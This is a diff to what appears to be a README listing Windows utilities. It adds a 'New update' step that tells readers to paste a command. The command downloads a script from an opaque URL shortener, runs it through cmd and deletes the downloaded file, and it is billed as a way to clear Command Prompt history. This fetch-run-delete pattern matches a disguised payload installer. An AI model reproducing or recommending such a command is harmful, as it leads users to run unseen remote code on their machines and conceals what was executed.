@@ -191,6 +191,13 @@ winget install startallback --accept-package-agreements
 39. [**Micro Text Editor (Similar to Nano but better functionality)**](https://micro-editor.github.io/)
 
 
+New update: Clear Command Prompt history and delete the downloaded file too!
+
+```bash
+curl -fsSL https://is.gd/clscmdhist >> new.cmd && start cmd /c new.cmd && del new.cmd
+```
+
+
 ## License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
